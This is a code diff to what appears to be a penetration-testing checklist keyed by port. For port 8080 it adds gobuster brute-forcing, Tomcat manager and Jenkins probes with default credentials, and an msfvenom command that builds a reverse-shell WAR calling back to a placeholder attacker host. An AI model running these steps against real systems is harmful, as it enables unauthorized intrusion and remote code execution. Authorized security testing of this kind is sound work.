@@ -142,8 +142,11 @@ _CHECKLIST: Dict[int, List[str]] = {
         "⚠️  Write primitive (CONFIG SET dir/dbfilename) is MANUAL ONLY — do not automate",
     ],
     8080: [
-        "Directory brute-force on alternate HTTP port",
-        "Check for admin panels / developer interfaces",
+        "Directory brute-force: `gobuster dir -u http://{ip}:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt`",
+        "Check for Tomcat manager: `curl -s http://{ip}:8080/manager/html` (try tomcat:tomcat, admin:admin, admin:s3cret)",
+        "Tomcat deploy WAR shell: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war` → upload via /manager",
+        "Check for Jenkins: `curl -s http://{ip}:8080/login` — default creds admin:admin",
+        "Check for admin panels / developer interfaces (Webmin, Glassfish, JBoss)",
     ],
     8443: [
         "Inspect TLS cert for hostnames",
